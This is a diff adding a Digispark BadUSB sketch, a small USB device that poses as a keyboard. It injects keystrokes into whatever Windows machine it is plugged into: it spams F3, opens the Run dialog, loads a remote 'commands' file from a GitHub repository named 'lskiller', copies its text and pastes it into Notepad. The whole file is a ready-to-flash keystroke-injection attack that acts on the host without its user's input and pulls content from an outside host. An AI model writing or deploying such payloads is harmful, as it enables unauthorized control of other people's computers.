@@ -1,0 +1,39 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
+
+  for (int i = 0; i < 50; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_F3);
+    DigiKeyboard.delay(12);
+  }
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print(F("https://raw.githubusercontent.com/anc-w/lskiller/refs/heads/main/commands"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3500);
+
+  DigiKeyboard.sendKeyStroke(KEY_A, MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(300);
+
+  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(400);
+
+  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(600);
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print(F("notepad"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1200);
+
+  DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(500);
+
+  for(;;) {}
+}
